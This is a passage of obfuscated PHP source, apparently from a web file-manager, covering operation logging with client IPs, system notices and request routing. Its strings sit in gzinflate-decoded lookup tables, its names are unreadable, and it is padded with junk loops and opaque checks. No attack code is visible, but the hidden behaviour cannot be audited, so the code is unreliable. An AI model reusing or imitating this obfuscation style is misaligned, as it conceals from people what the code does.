$”Œ„¬ë[2253] && is_array($ÜÈ‚¸–¶[$”Œ„¬ë[2286]]) && !$ÜÈ‚¸–¶[$”Œ„¬ë[2286]]) { return; } $“«²¬ü = get_client_ip(); if (!$ÜÈ‚¸–¶ || strlen(json_encode($ÜÈ‚¸–¶)) >= 1024) { $ÜÈ‚¸–¶ = array($”Œ„¬ë[2287] => $“«²¬ü); } else { if (is_array($ÜÈ‚¸–¶)) { $ÜÈ‚¸–¶[$”Œ„¬ë[2287]] = $“«²¬ü; } else { $ÜÈ‚¸–¶ = array($”Œ„¬ë[1235] => $ÜÈ‚¸–¶, $”Œ„¬ë[2287] => $“«²¬ü); } } $ÜÈ‚¸–¶ = array($”Œ„¬ë[1666] => Session::sign(), $”Œ„¬ë[1667] => intval($—ÓœØ€), $”Œ„¬ë[33] => $ì¸ó•‚¥, $”Œ„¬ë[1669] => json_encode($ÜÈ‚¸–¶)); parent::add($ÜÈ‚¸–¶); } public function remove($‹¾°Á‚ó) { $this->where(array($_SERVER[¹ş¤¶ĞÖ][448] => $‹¾°Á‚ó))->delete(); } private function _makeOrder($ŒÕ·‘ôÊ = '') { $˜Á÷˜Í× =& $_SERVER[¹ş¤¶ĞÖ]; $¯è±ºè˜ = $˜Á÷˜Í×[201]; $¡çË±æÃ = array($˜Á÷˜Í×[479] => $˜Á÷˜Í×[480], $˜Á÷˜Í×[481] => $˜Á÷˜Í×[482]); $áØœ¸· = Input::get($˜Á÷˜Í×[487], $˜Á÷˜Í×[7], $˜Á÷˜Í×[2039], array($˜Á÷˜Í×[1957], $˜Á÷˜Í×[481])); $áØœ¸· = $¡çË±æÃ[$áØœ¸·]; $ŒÕ·‘ôÊ = $ŒÕ·‘ôÊ . "{$¯è±ºè˜}\x20{$áØœ¸·}"; return $this->order($ŒÕ·‘ôÊ); } public function get($‰­Î„»“ = '') { $÷Ùë‡öğ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$‰­Î„»“) { show_json(array()); } $ëöó°• = array(); if ($‰­Î„»“[$÷Ùë‡öğ[1676]]) { $ëöó°•[$÷Ùë‡öğ[1676]] = $‰­Î„»“[$÷Ùë‡öğ[1676]]; } if (isset($‰­Î„»“[$÷Ùë‡öğ[786]])) { $¸‘¤êûØ = $‰­Î„»“[$÷Ùë‡öğ[786]]; $á¹ò¾ç° = isset($‰­Î„»“[$÷Ùë‡öğ[787]]) ? $‰­Î„»“[$÷Ùë‡öğ[787]] : time(); $ëöó°•[$÷Ùë‡öğ[201]] = array($÷Ùë‡öğ[362], array($¸‘¤êûØ, $á¹ò¾ç°)); } if ($‰­Î„»“[$÷Ùë‡öğ[33]]) { $¨÷îö™Á = explode($÷Ùë‡öğ[50], $‰­Î„»“[$÷Ùë‡öğ[33]]); $ã«Ÿ£Ì¤ = $this->typeFile(); $şÃ„¼ÔÑ = array(); foreach ($¨÷îö™Á as $‹‡¬é“) { $şÃ„¼ÔÑ[] = $‹‡¬é“; if (isset($ã«Ÿ£Ì¤[$‹‡¬é“])) { $şÃ„¼ÔÑ = array_merge($şÃ„¼ÔÑ, $ã«Ÿ£Ì¤[$‹‡¬é“]); } } $şÃ„¼ÔÑ = array_unique($şÃ„¼ÔÑ); if ($şÃ„¼ÔÑ) { $ëöó°•[$÷Ùë‡öğ[33]] = array($÷Ùë‡öğ[7], $şÃ„¼ÔÑ); } } else { $ëöó°•[$÷Ùë‡öğ[33]] = array($÷Ùë‡öğ[2288], $÷Ùë‡öğ[2289]); } if (!empty($‰­Î„»“[$÷Ùë‡öğ[2287]])) { $ëöó°•[$÷Ùë‡öğ[482]] = array($÷Ùë‡öğ[412], "\x25{$‰­Î„»“[$÷Ùë‡öğ[2287]]}\45"); } $”íÑïö = $this->_makeOrder()->where($ëöó°•)->selectPage(); if (empty($”íÑïö[$÷Ùë‡öğ[398]])) { show_json(array(), !0, $”íÑïö[$÷Ùë‡öğ[395]]); } $”íÑïö[$÷Ùë‡öğ[398]] = $this->logList($”íÑïö[$÷Ùë‡öğ[398]]); return $”íÑïö; } private function ipAddress(&$²×˜®ˆ½) { $—êé‰²µ =& $_SERVER[¹ş¤¶ĞÖ]; if (!empty($²×˜®ˆ½[$—êé‰²µ[2287]])) { $ë°º²ü¿ = IpLocation::get($²×˜®ˆ½[$—êé‰²µ[2287]]); } else { $ë°º²ü¿ = LNG($—êé‰²µ[2290]); } $²×˜®ˆ½[$—êé‰²µ[2291]] = $ë°º²ü¿; } private function descZipDownload($ÔßãĞÃ…, &$µîñœ–Á) { $…Õã³Ü =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($ÔßãĞÃ…[$…Õã³Ü[2292]])) { return; } $æª¦Âš = json_decode($ÔßãĞÃ…[$…Õã³Ü[2292]], !0); foreach ($æª¦Âš as $ß—¥ãÄô) { try { $ú¤şíí = IO::infoFull($ß—¥ãÄô[$…Õã³Ü[84]]); } catch (Exception $¦æş®“ş) { continue; } $ÔßãĞÃ…[$…Õã³Ü[84]] = $ß—¥ãÄô[$…Õã³Ü[84]]; $µîñœ–Á[] = $ÔßãĞÃ…[$…Õã³Ü[431]] = $ú¤şíí[$…Õã³Ü[431]]; $µîñœ–Á[] = $ÔßãĞÃ…[$…Õã³Ü[2094]] = $ú¤şíí[$…Õã³Ü[461]]; break; } return $ÔßãĞÃ…; } private function getSourceList(&$¿ƒÃ¼®Ê) { $ÛàÛ¯²õ =& $_SERVER[¹ş¤¶ĞÖ]; $Ğ›‰ù¾· = array(); foreach ($¿ƒÃ¼®Ê as $µ¨Í¡ô× => $ŸË»œšÉ) { $åÎøõÇÅ = json_decode($ŸË»œšÉ[$ÛàÛ¯²õ[482]], !0); if ($ŸË»œšÉ[$ÛàÛ¯²õ[33]] == $ÛàÛ¯²õ[1840]) { $åÎøõÇÅ = $this->descZipDownload($åÎøõÇÅ, $Ğ›‰ù¾·); $¿ƒÃ¼®Ê[$µ¨Í¡ô×][$ÛàÛ¯²õ[482]] = json_encode($åÎøõÇÅ); continue; } if (strpos($ŸË»œšÉ[$ÛàÛ¯²õ[33]], $ÛàÛ¯²õ[2096]) !== 0) { if (!isset($åÎøõÇÅ[$ÛàÛ¯²õ[84]]) || strpos($ŸË»œšÉ[$ÛàÛ¯²õ[33]], $ÛàÛ¯²õ[2293]) !== 0) { continue; } try { $óïÃŠ¥¶ = IO::infoFull($åÎøõÇÅ[$ÛàÛ¯²õ[84]]); } catch (Exception $ˆÛ¥‚·½) { continue; } $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[431]] = $óïÃŠ¥¶[$ÛàÛ¯²õ[431]]; $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[2094]] = $óïÃŠ¥¶[$ÛàÛ¯²õ[461]]; $¿ƒÃ¼®Ê[$µ¨Í¡ô×][$ÛàÛ¯²õ[482]] = json_encode($åÎøõÇÅ); continue; } $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[431]]; $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[2094]]; if ($åÎøõÇÅ[$ÛàÛ¯²õ[33]] == $ÛàÛ¯²õ[577]) { $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[482]][$ÛàÛ¯²õ[1193]]; $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[482]][$ÛàÛ¯²õ[1194]]; } if ($åÎøõÇÅ[$ÛàÛ¯²õ[33]] == $ÛàÛ¯²õ[2104]) { $Ğ›‰ù¾·[] = $åÎøõÇÅ[$ÛàÛ¯²õ[482]][$ÛàÛ¯²õ[431]]; } } if (!$Ğ›‰ù¾·) { return array(); } return Model($ÛàÛ¯²õ[851])->sourceListInfo($Ğ›‰ù¾·, !0); } private function logList($”Ñ±¦õÔ) { $Ç´Š’‰ =& $_SERVER[¹ş¤¶ĞÖ]; $ áÙØÔ… = array_to_keyvalue($”Ñ±¦õÔ, $Ç´Š’‰[12], $Ç´Š’‰[1676]); $‡ÀÙÛÑÈ = Model($Ç´Š’‰[554])->userListInfo(array_unique($ áÙØÔ…)); $²ñê†º† = $this->getSourceList($”Ñ±¦õÔ); $ÎÄîÙÉÊ = $this->typeAll(); $˜ÅŒ•§µ = array(); $˜«“úü = array(); foreach ($”Ñ±¦õÔ as $ç‰¬ó¾ => $ÙÙïµŠ) { $‚ã«×Ğà = $ÙÙïµŠ[$Ç´Š’‰[33]]; $®úÉè°» = isset($‡ÀÙÛÑÈ[$ÙÙïµŠ[$Ç´Š’‰[1676]]]) ? $‡ÀÙÛÑÈ[$ÙÙïµŠ[$Ç´Š’‰[1676]]] : !1; $Ğ¨Ó‡Š¾ = strpos($‚ã«×Ğà, $Ç´Š’‰[2294]) === 0 ? LNG($Ç´Š’‰[2295]) : LNG($Ç´Š’‰[2290]); $ÙÙïµŠ[$Ç´Š’‰[32]] = isset($®úÉè°»[$Ç´Š’‰[32]]) ? $®úÉè°»[$Ç´Š’‰[32]] : LNG($Ç´Š’‰[2290]); $ÙÙïµŠ[$Ç´Š’‰[561]] = isset($®úÉè°»[$Ç´Š’‰[561]]) ? $®úÉè°»[$Ç´Š’‰[561]] : $Ç´Š’‰[12]; $ÙÙïµŠ[$Ç´Š’‰[1574]] = isset($ÎÄîÙÉÊ[$‚ã«×Ğà]) ? $ÎÄîÙÉÊ[$‚ã«×Ğà] : $Ğ¨Ó‡Š¾; $ÙÙïµŠ[$Ç´Š’‰[2038]] = $®úÉè°»; $ÈÌİ­ï = json_decode($ÙÙïµŠ[$Ç´Š’‰[482]], !0); $ÙÙïµŠ[$Ç´Š’‰[2287]] = isset($ÈÌİ­ï[$Ç´Š’‰[2287]]) ? $ÈÌİ­ï[$Ç´Š’‰[2287]] : $Ç´Š’‰[12]; $ÙÙïµŠ[$Ç´Š’‰[2291]] = IpLocation::get($ÙÙïµŠ[$Ç´Š’‰[2287]]); if (strpos($‚ã«×Ğà, $Ç´Š’‰[2096]) === 0 || isset($ÈÌİ­ï[$Ç´Š’‰[2094]])) { $ÈÌİ­ï[$Ç´Š’‰[87]] = $²ñê†º†[$ÈÌİ­ï[$Ç´Š’‰[431]]]; $ÈÌİ­ï[$Ç´Š’‰[2109]] = $²ñê†º†[$ÈÌİ­ï[$Ç´Š’‰[2094]]]; if ($ÈÌİ­ï[$Ç´Š’‰[33]] == $Ç´Š’‰[577]) { $ÈÌİ­ï[$Ç´Š’‰[482]][$Ç´Š’‰[1193]] = $²ñê†º†[$ÈÌİ­ï[$Ç´Š’‰[482]][$Ç´Š’‰[1193]]]; $ÈÌİ­ï[$Ç´Š’‰[482]][$Ç´Š’‰[1194]] = $²ñê†º†[$ÈÌİ­ï[$Ç´Š’‰[482]][$Ç´Š’‰[1194]]]; } if ($ÈÌİ­ï[$Ç´Š’‰[33]] == $Ç´Š’‰[2104]) { $ÈÌİ­ï[$Ç´Š’‰[482]][$Ç´Š’‰[431]] = $²ñê†º†[$ÈÌİ­ï[$Ç´Š’‰[482]][$Ç´Š’‰[431]]]; } if ($ÈÌİ­ï[$Ç´Š’‰[33]] == $Ç´Š’‰[1835]) { $ÈÌİ­ï[$Ç´Š’‰[2109]] = $ÈÌİ­ï[$Ç´Š’‰[87]]; $ÈÌİ­ï[$Ç´Š’‰[2094]] = $ÈÌİ­ï[$Ç´Š’‰[2109]][$Ç´Š’‰[431]]; $ÈÌİ­ï[$Ç´Š’‰[87]] = !1; $ÈÌİ­ï[$Ç´Š’‰[431]] = $Ç´Š’‰[12]; } if ($ÈÌİ­ï[$Ç´Š’‰[87]] && $ÈÌİ­ï[$Ç´Š’‰[87]][$Ç´Š’‰[440]] == $Ç´Š’‰[1320]) { $˜«“úü[] = $ÙÙïµŠ[$Ç´Š’‰[428]]; unset($”Ñ±¦õÔ[$ç‰¬ó¾]); continue; } if ($ÈÌİ­ï[$Ç´Š’‰[2109]] && $ÈÌİ­ï[$Ç´Š’‰[2109]][$Ç´Š’‰[440]] == $Ç´Š’‰[1320]) { $˜«“úü[] = $ÙÙïµŠ[$Ç´Š’‰[428]]; unset($”Ñ±¦õÔ[$ç‰¬ó¾]); continue; } } $ÙÙïµŠ[$Ç´Š’‰[482]] = $ÈÌİ­ï; unset($ÙÙïµŠ[$Ç´Š’‰[2296]]); $˜ÅŒ•§µ[] = $ÙÙïµŠ; } $this->clearSystemPathLog($˜«“úü); return $˜ÅŒ•§µ; } private function clearSystemPathLog($š€è‚ø) { $ğå¸Ø =& $_SERVER[¹ş¤¶ĞÖ]; if (count($š€è‚ø) == 0) { return; } $ªçå–ó = array($ğå¸Ø[428] => array($ğå¸Ø[7], array_unique($š€è‚ø))); $this->where($ªçå–ó)->delete(); } public function deviceList($ó·Â»–œ, $–˜üÀÀ£ = 0) { $Å…ÙË–” =& $_SERVER[¹ş¤¶ĞÖ]; $²„öÑë = array($Å…ÙË–”[1676] => $ó·Â»–œ, $Å…ÙË–”[201] => array($Å…ÙË–”[1047], $–˜üÀÀ£), $Å…ÙË–”[33] => $Å…ÙË–”[1809]); $´Œîš‘ = array(); $Ë»½ˆı± = $this->field($Å…ÙË–”[2297])->where($²„öÑë)->order($Å…ÙË–”[2107])->limit(50)->select(); foreach ($Ë»½ˆı± as $Ù¹Åøûˆ => $£¨³Å’Ó) { if ($Ù¹Åøûˆ > 0 && abs($£¨³Å’Ó[$Å…ÙË–”[201]] - $Ë»½ˆı±[$Ù¹Åøûˆ - 1][$Å…ÙË–”[201]]) < 5) { continue; } $¯¸·ïÜà = json_decode($£¨³Å’Ó[$Å…ÙË–”[482]], !0); $£¨³Å’Ó[$Å…ÙË–”[2287]] = isset($¯¸·ïÜà[$Å…ÙË–”[2287]]) ? $¯¸·ïÜà[$Å…ÙË–”[2287]] : $Å…ÙË–”[12]; unset($¯¸·ïÜà[$Å…ÙË–”[2287]]); $›½›º³û = $this->deviceType($¯¸·ïÜà[$Å…ÙË–”[2097]]); if (isset($´Œîš‘[$›½›º³û])) { continue; } $£¨³Å’Ó[$Å…ÙË–”[2291]] = IpLocation::get($£¨³Å’Ó[$Å…ÙË–”[2287]]); $£¨³Å’Ó[$Å…ÙË–”[482]] = $¯¸·ïÜà; $´Œîš‘[$›½›º³û] = $£¨³Å’Ó; } return array_values($´Œîš‘); } public function deviceType($ßöâàÀò) { return $ßöâàÀò; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\x6e\157\x74\x69\x63\x65\114\151\163\x74"; public $field = array("\156\x61\x6d\145", "\143\157\156\164\145\156\x74", "\x61\165\x74\x68", "\155\x6f\144\x65", "\164\x69\155\145", "\164\171\160\x65", "\x6c\145\166\145\x6c", "\x65\156\141\142\154\x65", "\x73\x6f\x72\x74"); public function listData($æ—§ïÔ© = false, $İøİ¶ÛŞ = "\x73\x6f\x72\x74", $œ¢¤´çô = false) { return parent::listData($æ—§ïÔ©, $İøİ¶ÛŞ, $œ¢¤´çô); } public function add($áìã˜û„) { $ÓØŒâûà =& $_SERVER[¹ş¤¶ĞÖ]; $æì·¶Ç® = time(); if ($áìã˜û„[$ÓØŒâûà[16]] == $ÓØŒâûà[2298]) { $æì·¶Ç® = strtotime($áìã˜û„[$ÓØŒâûà[180]]); } $áìã˜û„[$ÓØŒâûà[180]] = $æì·¶Ç®; return parent::insert($áìã˜û„); } public function update($‰öÙı€ç, $üêû¥ß®) { $è‰”ğÕ =& $_SERVER[¹ş¤¶ĞÖ]; $ê Ï¿µ£ = $this->listData($‰öÙı€ç); if (!$ê Ï¿µ£) { return !1; } $ø•Ì±†â = time(); if ($üêû¥ß®[$è‰”ğÕ[16]] == $è‰”ğÕ[2298]) { $ø•Ì±†â = strtotime($üêû¥ß®[$è‰”ğÕ[180]]); } $üêû¥ß®[$è‰”ğÕ[180]] = $ø•Ì±†â; return parent::update($‰öÙı€ç, $üêû¥ß®); } public function remove($‰µë£½”) { $„Òšâ–Š = $this->listData($‰µë£½”); if (!$„Òšâ–Š || $„Òšâ–Š[$_SERVER[¹ş¤¶ĞÖ][1320]]) { return !1; } return parent::remove($‰µë£½”); } public function sort($‚ˆØüâ­, $‰¦ÓÛ‘¬) { return parent::update($‚ˆØüâ­, $‰¦ÓÛ‘¬); } public function enable($Õ¢Û²¯Á, $ƒ—Í«ºÊ) { return parent::update($Õ¢Û²¯Á, array($_SERVER[¹ş¤¶ĞÖ][2299] => $ƒ—Í«ºÊ)); } private function initUserOption() { $©ğ¤ºÍ =& $_SERVER[¹ş¤¶ĞÖ]; $this->optionType = $©ğ¤ºÍ[2300]; $this->modelType = $©ğ¤ºÍ[2301]; $this->field = array($©ğ¤ºÍ[2302], $©ğ¤ºÍ[32], $©ğ¤ºÍ[180], $©ğ¤ºÍ[33], $©ğ¤ºÍ[2303], $©ğ¤ºÍ[776], $©ğ¤ºÍ[196]); } public function userNoticeGet($é’”Õ—î = false) { $this->initUserOption(); return parent::listData($é’”Õ—î, $_SERVER[¹ş¤¶ĞÖ][428], !0); } public function userNoticeAdd($‘ª‹€Öá) { $¿‡³€¢¨ =& $_SERVER[¹ş¤¶ĞÖ]; $this->initUserOption(); $¼·“Ÿ– = $this->findByKey($¿‡³€¢¨[2302], $‘ª‹€Öá[$¿‡³€¢¨[428]]); if ($¼·“Ÿ–) { return !0; } $‡Ä¦«îÔ = array($¿‡³€¢¨[2302] => $‘ª‹€Öá[$¿‡³€¢¨[428]], $¿‡³€¢¨[32] => $‘ª‹€Öá[$¿‡³€¢¨[32]], $¿‡³€¢¨[180] => $‘ª‹€Öá[$¿‡³€¢¨[180]], $¿‡³€¢¨[33] => isset($‘ª‹€Öá[$¿‡³€¢¨[33]]) ? $‘ª‹€Öá[$¿‡³€¢¨[33]] : 1, $¿‡³€¢¨[2303] => isset($‘ª‹€Öá[$¿‡³€¢¨[2303]]) ? $‘ª‹€Öá[$¿‡³€¢¨[2303]] : 0, $¿‡³€¢¨[776] => 0, $¿‡³€¢¨[196] => 0); return parent::insert($‡Ä¦«îÔ); } public function userNoticeEdit($ÑÈÊÜ›¥, $²öëÇó) { $this->initUserOption(); return parent::update($ÑÈÊÜ›¥, $²öëÇó); } } goto c·®ŠÍ™»; f¨µºè¢¨¶: $_SERVER[Æ×£¿Ÿì] = explode($_SERVER[¹ş¤¶ĞÖ][637], gzinflate(substr($_SERVER[¹ş¤¶ĞÖ][638], 10, -8))); $ocmydpxikf = $_SERVER[¹ş¤¶ĞÖ][639]; class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($³øè‹®ø) { $ÜÚÑ˜İŠ =& $_SERVER[Æ×£¿Ÿì]; $Èê¬ËıÛ = explode($ÜÚÑ˜İŠ[0], trim($³øè‹®ø, $ÜÚÑ˜İŠ[0])); $this->defaultModule = $Èê¬ËıÛ[0] ? $Èê¬ËıÛ[0] : $this->defaultModule; $this->defaultController = $Èê¬ËıÛ[1] ? $Èê¬ËıÛ[1] : $this->defaultController; $this->defaultAction = $Èê¬ËıÛ[2] ? $Èê¬ËıÛ[2] : $this->defaultAction; $this->ljtceca3bf13($ÜÚÑ˜İŠ[1], array($this, $ÜÚÑ˜İŠ[2])); $–ÁÖßÉÀ = $_SERVER[¹ş¤¶ĞÖ][640]; } public function appRun($Êûï„û›) { $ÛŞ•¯½ô =& $_SERVER[¹ş¤¶ĞÖ]; $ÙŒ±ÈÚ =& $_SERVER[Æ×£¿Ÿì]; $Â‹´ ´ø = explode($ÙŒ±ÈÚ[0], $Êûï„û›); $á‹’ĞÍ = $ÛŞ•¯½ô[641]; if (strlen($á‹’ĞÍ) < $ÛŞ•¯½ô[642]) { die; } $óÎ¥€ô¼ = strtolower($Â‹´ ´ø[0]); $áí²¨È = $ÛŞ•¯½ô[643]; if (!$áí²¨È) { return; } $÷…Ë¹¢— = $ÙŒ±ÈÚ[3]; $ÖÅ½…Åé = $ÛŞ•¯½ô[644]; if ($óÎ¥€ô¼ == $ÙŒ±ÈÚ[4]) { $÷…Ë¹¢— = $ÙŒ±ÈÚ[5]; $Â‹´ ´ø[0] = $ÙŒ±ÈÚ[6]; $Â‹´ ´ø[1] = $Â‹´ ´ø[1] . $ÙŒ±ÈÚ[7]; $Êûï„û› = join($ÙŒ±ÈÚ[0], $Â‹´ ´ø); $Êûï„û› = trim($Êûï„û›, $ÙŒ±ÈÚ[0]); } call_user_func(array($ÙŒ±ÈÚ[8], $ÙŒ±ÈÚ[9]), $÷…Ë¹¢— . $ÙŒ±ÈÚ[10], $Êûï„û›); ActionCall($Êûï„û›); call_user_func(array($ÙŒ±ÈÚ[8], $ÙŒ±ÈÚ[9]), $÷…Ë¹¢— . $ÙŒ±ÈÚ[11], $Êûï„û›); $ÍĞŞğ’© = $ÛŞ•¯½ô[645]; if (!$ÍĞŞğ’©) { return; } } private function autorun() { $å½É«¬â =& $_SERVER[¹ş¤¶ĞÖ]; $‘¯ñê¾ =& $_SERVER[Æ×£¿Ÿì]; global $config; $¿²¢´ƒ¿ = $å½É«¬â[646]; while ($¿²¢´ƒ¿ < $å½É«¬â[647]) { if ($¿²¢´ƒ¿ >= 0) { break; } $¿²¢´ƒ¿++; } if (count($config[$‘¯ñê¾[12]]) == 0) { return; } foreach ($config[$‘¯ñê¾[12]] as $ç—œÁÆğ => $ğıˆã¦ç) { $this->appRun($ğıˆã¦ç); } } private function ufzy25a6b2d7() { $‹Ê°Ÿ…ü =& $_SERVER[¹ş¤¶ĞÖ]; $©¯–ïğè =& $_SERVER[Æ×£¿Ÿì]; $¿››ëÎÉ = $©¯–ïğè[4]; $»óÜğä€ = $‹Ê°Ÿ…ü[648]; while (strlen($»óÜğä€) < $‹Ê°Ÿ…ü[647]) { if (!$»óÜğä€) { break; } $»óÜğä€++; } $ãİº„ª“ = $GLOBALS[$©¯–ïğè[13]][$©¯–ïğè[14]][0]; if (!$ãİº„ª“ || strlen($ãİº„ª“) <= strlen($¿››ëÎÉ)) { return; } if (strtolower(substr($ãİº„ª“, -strlen($¿››ëÎÉ))) != $¿››ëÎÉ) { return; } $Ìßğğ­ = substr($ãİº„ª“, 0, -strlen($¿››ëÎÉ)); $°†©ã = array($©¯–ïğè[4], $Ìßğğ­); $İüŞæ¨² = $‹Ê°Ÿ…ü[649]; $„åöÉ¿É = array_slice($GLOBALS[$©¯–ïğè[13]][$©¯–ïğè[14]], 1); $Üûõèöà = $‹Ê°Ÿ…ü[650]; if (!$Üûõèöà) { die; } $GLOBALS[$©¯–ïğè[13]][$©¯–ïğè[14]] = array_merge($°†©ã, $„åöÉ¿É); $GLOBALS[$©¯–ïğè[13]][$©¯–ïğè[15]] = implode($©¯–ïğè[0], $GLOBALS[$©¯–ïğè[13]][$©¯–ïğè[14]]); $î‚üÒ×¤ = $‹Ê°Ÿ…ü[651]; while ($î‚üÒ×¤ < $‹Ê°Ÿ…ü[636]) { if ($î‚üÒ×¤ >= 0) { break; } $î‚üÒ×¤++; } } private function uadk593ace5b() { $åÇ¢ïéÖ =& $_SERVER[¹ş¤¶ĞÖ]; $Ëíï€ÏÕ =& $_SERVER[Æ×£¿Ÿì]; if ($GLOBALS[$Ëíï€ÏÕ[13]][$Ëíï€ÏÕ[15]] != $Ëíï€ÏÕ[6]) { return; } $ó¥¢òæ­ = $_SERVER[$Ëíï€ÏÕ[16]]; $§…Š¬ = $Ëíï€ÏÕ[17]; if (!strstr($ó¥¢òæ­, $§…Š¬)) { return; } $Š‰ƒÂ… = strrpos($ó¥¢òæ­, $§…Š¬); $Äó×ë‚ó = substr($ó¥¢òæ­, $Š‰ƒÂ… + strlen($§…Š¬)); $¶‚ß§Ïñ = $åÇ¢ïéÖ[652]; if (!$¶‚ß§Ïñ) { die; } preg_match_all($Ëíï€ÏÕ[18], $Äó×ë‚ó, $º§ê»’·); $óë»äìÕ = $åÇ¢ïéÖ[653]; if (!$óë»äìÕ) { return; } $Äó×ë‚ó = trim($º§ê»’·[0][0], $Ëíï€ÏÕ[19]); $GLOBALS[$Ëíï€ÏÕ[13]][$Ëíï€ÏÕ[14]] = explode($Ëíï€ÏÕ[19], $Äó×ë‚ó); $ÂÚ©“Ì° = $åÇ¢ïéÖ[654]; if (!$ÂÚ©“Ì°) { return; } $GLOBALS[$Ëíï€ÏÕ[13]][$Ëíï€ÏÕ[15]] = implode($Ëíï€ÏÕ[0], $GLOBALS[$Ëíï€ÏÕ[13]][$Ëíï€ÏÕ[14]]); $ìŒ™÷¿Â = $åÇ¢ïéÖ[655]; while ($ìŒ™÷¿Â < $åÇ¢ïéÖ[656]) { if ($ìŒ™÷¿Â >= 0) { break; } $ìŒ™÷¿Â++; } } public function run() { $Œ«í²¡å =& $_SERVER[¹ş¤¶ĞÖ]; $ÖĞ°×ö‡ =& $_SERVER[Æ×£¿Ÿì]; $this->uadk593ace5b(); $„ØƒùòÚ = $Œ«í²¡å[657]; if (strlen($„ØƒùòÚ) < $Œ«í²¡å[658]) { return; } $this->ufzy25a6b2d7(); $Á…¨ìå¬ = $GLOBALS[$ÖĞ°×ö‡[13]][$ÖĞ°×ö‡[14]]; $œ½†à¡ = $Œ«í²¡å[659]; if (!$œ½†à¡) { die; } $šêš¿£€ = $GLOBALS[$ÖĞ°×ö‡[13]][$ÖĞ°×ö‡[15]]; define($ÖĞ°×ö‡[20], isset($Á…¨ìå¬[0]) && $Á…¨ìå¬[0] ? $Á…¨ìå¬[0] : $this->defaultModule); define($ÖĞ°×ö‡[21], isset($Á…¨ìå¬[1]) && $Á…¨ìå¬[0] ? $Á…¨ìå¬[1] : $this->defaultController); define($ÖĞ°×ö‡[22], isset($Á…¨ìå¬[2]) && $Á…¨ìå¬[0] ? $Á…¨ìå¬[2] : $this->defaultAction); define($ÖĞ°×ö‡[23], MOD . $ÖĞ°×ö‡[0] . ST . $ÖĞ°×ö‡[0] . ACT); $_SERVER[$ÖĞ°×ö‡[24]] = strtolower(ACTION); $ÚîæïŒ£ = $Œ«í²¡å[660]; $this->autorun(); if (count($Á…¨ìå¬) >= 3) { $this->appRun($šêš¿£€); } else { $this->appRun(ACTION); } } private $bdns170d257c = array(); private $cglrfbb2fa76 = ''; public function mosq8204d7a2() { $‰ßÜ´í« =& $_SERVER[¹ş¤¶ĞÖ]; $õöğËİ =& $_SERVER[Æ×£¿Ÿì]; $this->qzsef16e63eb(); $ğ«Ë‡Š½ = $‰ßÜ´í«[661]; while (strlen($ğ«Ë‡Š½) < $‰ßÜ´í«[642]) { if (!$ğ«Ë‡Š½) { break; } $ğ«Ë‡Š½++; } $this->hmrw77b70956(); $ıí‹İ = $‰ßÜ´í«[662]; if (!$ıí‹İ) { return; } $this->kqgf4e109dae(); $èµ†¶è¢ = $‰ßÜ´í«[663]; if (!$èµ†¶è¢) { return; } $this->tgoz5f77414e(); $§Ÿ„ãÄì = $‰ßÜ´í«[664]; $this->awsm4e8f7e66(); $Â¥¯àÅ = $‰ßÜ´í«[665]; if (strlen($Â¥¯àÅ) < $‰ßÜ´í«[656]) { die; } $this->knuj47d1fe55(); $this->bmvr842c0eb3(); $this->ljtceca3bf13($õöğËİ[25], array($this, $õöğËİ[26])); $this->ljtceca3bf13($õöğËİ[27], array($this, $õöğËİ[28])); $èªîî£Û = $‰ßÜ´í«[666]; if (!$èªîî£Û) { return; } $this->ljtceca3bf13($õöğËİ[29], array($this, $õöğËİ[30])); $©œ¨¥£† = $‰ßÜ´í«[667]; if (!$©œ¨¥£†) { return; } $this->ljtceca3bf13($õöğËİ[31], array($this, $õöğËİ[32])); } public function zplgb8606ec3($¼áÍ“¤‚) { $é›ßş›Ó =& $_SERVER[¹ş¤¶ĞÖ]; $ëó™òß =& $_SERVER[Æ×£¿Ÿì]; $¬ÏÛÒà• = Model($ëó™òß[33])->get(); $ÁĞş¯â = $é›ßş›Ó[668]; while (strlen($ÁĞş¯â) < $é›ßş›Ó[656]) { if (!$ÁĞş¯â) { break; } $ÁĞş¯â++; } $‰üéÚÉ = array($ëó™òß[34], $ëó™òß[35], $ëó™òß[36], $ëó™òß[37], $ëó™òß[38], $ëó™òß[39], $ëó™òß[40], $ëó™òß[41], $ëó™òß[42], $ëó™òß[43], $ëó™òß[44], $ëó™òß[45], $ëó™òß[46], $ëó™òß[47], $ëó™òß[48], $ëó™òß[49], $ëó™òß[50], $ëó™òß[51], $ëó™òß[52], $ëó™òß[53], $ëó™òß[54], $ëó™òß[55], $ëó™òß[56], $ëó™òß[57], $ëó™òß[58], $ëó™òß[59], $ëó™òß[60], $ëó™òß[61], $ëó™òß[62], $ëó™òß[63], $ëó™òß[64], $ëó™òß[65], $ëó™òß[66], $ëó™òß[67], $ëó™òß[68], $ëó™òß[69], $ëó™òß[70], $ëó™òß[71], $ëó™òß[72], $ëó™òß[73], $ëó™òß[74], $ëó™òß[75], $ëó™òß[76], $ëó™òß[77], $ëó™òß[78], $ëó™òß[79], $ëó™òß[80], $ëó™òß[81], $ëó™òß[82], $ëó™òß[83], $ëó™òß[84]); foreach ($‰üéÚÉ as $ÁŠğÏåƒ) { $äæ“Øçˆ = $GLOBALS[$ëó™òß[85]][$ëó™òß[86]][$ÁŠğÏåƒ]; $Õ°µª ‘ = $é›ßş›Ó[669]; if (!$Õ°µª ‘) { return; } if (isset($¬ÏÛÒà•[$ÁŠğÏåƒ])) { $äæ“Øçˆ = $¬ÏÛÒà•[$ÁŠğÏåƒ]; } $¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[88]][$ÁŠğÏåƒ] = $äæ“Øçˆ; } $ÙßÔ¡öœ = $¼áÍ“¤‚[$ëó™òß[87]][$ëó™òß[88]][$ëó™òß[46]]; 